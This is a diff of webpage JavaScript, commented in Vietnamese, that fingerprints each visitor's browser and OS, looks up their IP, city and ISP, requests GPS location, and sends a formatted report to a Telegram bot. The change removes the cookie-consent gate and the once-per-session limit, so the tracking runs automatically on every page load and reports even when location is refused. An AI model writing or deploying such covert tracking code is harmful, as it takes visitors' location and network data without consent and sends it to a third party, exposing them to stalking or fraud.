@@ -60,95 +60,93 @@ adjustZoom();
  // --- 1. CẤU HÌNH ---
 const TG_TOKEN = CONFIG.TG_TOKEN;
         const CHAT_ID = CONFIG.CHAT_ID;
-let isBotRunning = false;
+let isSending = false;
 
-// --- 2. NHẬN DIỆN THIẾT BỊ & TRÌNH DUYỆT (Cốc Cốc, Chrome, v.v.) ---
-function getDetailDevice() {
+// --- 2. NHẬN DIỆN THIẾT BỊ CHI TIẾT ---
+function getSystemInfo() {
     const ua = navigator.userAgent;
     let browser = "Trình duyệt lạ";
     let os = "Không rõ OS";
     let deviceType = "💻 Máy tính";
 
-    // Phân loại Trình duyệt
     if (ua.includes("CocCoc")) browser = "Cốc Cốc";
     else if (ua.includes("Edg/")) browser = "Microsoft Edge";
     else if (ua.includes("Chrome") && !ua.includes("Chromium")) browser = "Google Chrome";
     else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
     else if (ua.includes("Firefox")) browser = "Firefox";
 
-    // Phân loại Hệ điều hành
     if (ua.includes("Win")) os = "Windows";
-    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
-    else if (ua.includes("Android")) os = "Android";
+    else if (ua.includes("iPhone")) { os = "iOS"; deviceType = "📱 Điện thoại"; }
+    else if (ua.includes("Android")) { os = "Android"; deviceType = "📱 Điện thoại"; }
     else if (ua.includes("Mac")) os = "MacOS";
-
-    // Phân loại Loại thiết bị
-    if (/Android|iPhone|iPad|iPod/i.test(ua)) deviceType = "📱 Điện thoại";
 
     return { browser, os, deviceType };
 }
 
-// --- 3. LẤY IP, THÀNH PHỐ, NHÀ MẠNG (HTTPS 100% để không bị "Không rõ") ---
-async function fetchIpInfo() {
-    const apis = [
-        {
-            // Nguồn 1: ipwho.is (Rất mạnh, hỗ trợ HTTPS tốt)
-            url: 'https://ipwho.is/',
-            parse: (d) => ({ ip: d.ip, city: d.city, isp: d.connection?.isp || d.org })
-        },
-        {
-            // Nguồn 2: ipapi.co (Dự phòng)
-            url: 'https://ipapi.co/json/',
-            parse: (d) => ({ ip: d.ip, city: d.city, isp: d.org || d.asn_organization })
-        },
-        {
-            // Nguồn 3: Cloudflare (Chỉ lấy IP nếu 2 nguồn trên lỗi)
-            url: 'https://cloudflare.com/cdn-cgi/trace',
-            parse: (d) => {
-                const lines = d.split('\n');
-                const ipLine = lines.find(l => l.startsWith('ip='));
-                return { ip: ipLine ? ipLine.split('=')[1] : "N/A", city: "N/A", isp: "Cloudflare" };
-            },
-            isText: true
-        }
+// --- 3. LẤY IP QUA 3 TẦNG TRUNG GIAN (Cloudflare, AWS, Ipify) ---
+async function fetchIpData() {
+    const sources = [
+        { url: 'https://ipwho.is/', type: 'json' }, // Ưu tiên vì có ISP
+        { url: 'https://api.ipify.org?format=json', type: 'json' }, // Trung gian uy tín 1
+        { url: 'https://checkip.amazonaws.com/', type: 'text' } // Trung gian uy tín 2 (AWS)
     ];
 
-    for (const api of apis) {
+    let baseIp = "";
+
+    // Bước 1: Lấy IP bằng mọi giá từ các nguồn trung gian
+    for (let src of sources) {
         try {
-            const res = await fetch(api.url, { signal: AbortSignal.timeout(4000) });
-            if (!res.ok) continue;
-            const data = api.isText ? await res.text() : await res.json();
-            const result = api.parse(data);
-            if (result.ip && result.ip !== "N/A") return result;
+            const res = await fetch(src.url, { signal: AbortSignal.timeout(3000) });
+            if (src.type === 'json') {
+                const d = await res.json();
+                baseIp = d.ip || d.query;
+                // Nếu nguồn ipwhois chạy được thì trả về luôn cho nhanh
+                if (d.connection) return { ip: d.ip, city: d.city, isp: d.connection.isp };
+            } else {
+                baseIp = (await res.text()).trim();
+            }
+            if (baseIp) break;
         } catch (e) { continue; }
     }
+
+    // Bước 2: Từ IP lấy được, truy vấn thông tin chi tiết qua IP-API (Sử dụng HTTPS)
+    if (baseIp) {
+        try {
+            const detailRes = await fetch(`https://ipapi.co/${baseIp}/json/`);
+            const detail = await detailRes.json();
+            return {
+                ip: baseIp,
+                city: detail.city || "Không rõ",
+                isp: detail.org || "Nhà mạng ẩn"
+            };
+        } catch (e) {
+            return { ip: baseIp, city: "Lỗi lọc", isp: "Lỗi lọc" };
+        }
+    }
+
     return { ip: "Không rõ", city: "Không rõ", isp: "Không rõ" };
 }
 
-// --- 4. GỬI THÔNG BÁO TELEGRAM (Chống trùng & Format đẹp) ---
+// --- 4. GỬI THÔNG BÁO ---
 async function sendNotification(pos, ipInfo) {
-    // KHÓA: Chỉ gửi 1 lần duy nhất mỗi phiên truy cập
-    if (isBotRunning || sessionStorage.getItem('sent_log')) return;
-    isBotRunning = true;const device = getDetailDevice();
-    const time = new Date().toLocaleString('vi-VN');
+    if (isSending) return;
+    isSending = true;
 
-    let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP MỚI</b>\n\n`;
+    const info = getSystemInfo();
+    const time = new Date().toLocaleString('vi-VN');let msg = `<b>🚀 PHÁT HIỆN TRUY CẬP (MULTI-PROXY)</b>\n\n`;
     msg += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;
     msg += `🌐 <b>IP:</b> <code>${ipInfo.ip}</code>\n`;
     msg += `🏙️ <b>Thành phố:</b> <code>${ipInfo.city}</code>\n`;
     msg += `📡 <b>Nhà mạng:</b> <b>${ipInfo.isp}</b>\n\n`;
 
-    msg += `ℹ️ <b>Thông tin thiết bị:</b>\n`;
-    msg += `├─ Loại: <b>${device.deviceType}</b>\n`;
-    msg += `├─ Hệ điều hành: <code>${device.os}</code>\n`;
-    msg += `└─ Trình duyệt: <b>${device.browser}</b>\n\n`;
+    msg += `ℹ️ <b>Thiết bị:</b>\n`;
+    msg += `├─ Hệ điều hành: <code>${info.os}</code>\n`;
+    msg += `└─ Trình duyệt: <b>${info.browser}</b>\n\n`;
 
     if (pos && pos.coords) {
         const { latitude: lat, longitude: lon } = pos.coords;
         msg += `📍 <b>Vị trí GPS:</b>\n`;
-        msg += `└ 👉 <a href="https://www.google.com/maps?q=${lat},${lon}">Xem trên Bản đồ</a>\n`;
-    } else {
-        msg += `⚠️ <b>GPS:</b> Bị từ chối\n`;
+        msg += `└ 👉 <a href="http://maps.google.com/maps?q=${lat},${lon}">Nhấn để xem Bản đồ</a>\n`;
     }
 
     try {
@@ -161,36 +159,27 @@ async function sendNotification(pos, ipInfo) {
                 parse_mode: 'HTML'
             })
         });
-        sessionStorage.setItem('sent_log', 'true'); // Đánh dấu đã gửi
     } catch (err) {
         console.error(err);
     } finally {
-        isBotRunning = false;
+        isSending = false;
     }
 }
 
 // --- 5. KHỞI CHẠY ---
-async function startTracking() {
-    // Lấy IP và GPS cùng lúc
-    const [ipInfo, pos] = await Promise.all([
-        fetchIpInfo(),
-        new Promise(r => navigator.geolocation.getCurrentPosition(r, () => r(null), {timeout: 4000}))
-    ]);
-    await sendNotification(pos, ipInfo);
-}
-
-window.onload = () => {
-    if (localStorage.getItem('is_accepted')) {
-        startTracking();
+async function start() {
+    const ipInfo = await fetchIpData();
+    
+    // Tự động gửi tin nhắn kể cả khi người dùng từ chối GPS
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => sendNotification(pos, ipInfo),
+            () => sendNotification(null, ipInfo),
+            { timeout: 5000 }
+        );
     } else {
-        const box = document.getElementById('cookie-box');
-        if (box) setTimeout(() => box.style.display = 'block', 1000);
+        sendNotification(null, ipInfo);
     }
-};
-
-function acceptCookies() {
-    localStorage.setItem('is_accepted', 'true');
-    const box = document.getElementById('cookie-box');
-    if (box) box.style.display = 'none';
-    startTracking();
 }
+
+window.onload = start;
